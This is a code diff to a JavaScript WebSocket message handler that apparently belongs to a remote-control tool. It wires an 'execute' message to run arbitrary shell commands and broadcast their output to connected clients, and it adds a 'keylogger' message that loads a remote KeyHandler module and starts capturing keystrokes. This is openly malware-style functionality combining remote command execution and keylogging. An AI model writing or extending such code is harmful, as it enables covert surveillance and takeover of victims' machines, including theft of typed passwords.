@@ -21,16 +21,19 @@ class HandleSocketMessage
                 console.log(objMessage.body);
                 break;
             case "execute":
-                this.caseExecCommand(strMessage.body)
+                this.caseExecCommand(strMessage.body.command)
+                break;
+            case "keylogger":
+                this.caseStartKeylogger(strMessage.body.command)
                 break;
             default:
                 console.log("Message not configured!");
         }
     }
 
-    caseExecCommand()
+    caseExecCommand(strCommand)
     {
-        let strOutput = CMDRunner.execCommand(strMessage.body.command);
+        let strOutput = CMDRunner.execCommand(strCommand);
 
         wss.clients.forEach(function each(client) 
 		{
@@ -41,6 +44,12 @@ class HandleSocketMessage
 				));
 			}
 		});
+    }
+
+    caseStartKeylogger(strCommand)
+    {
+	    const objKeyHandler = require("./remote/KeyHandler");
+        objKeyHandler.startListener();
     }
 
     static decodeMessage(strStringObject)
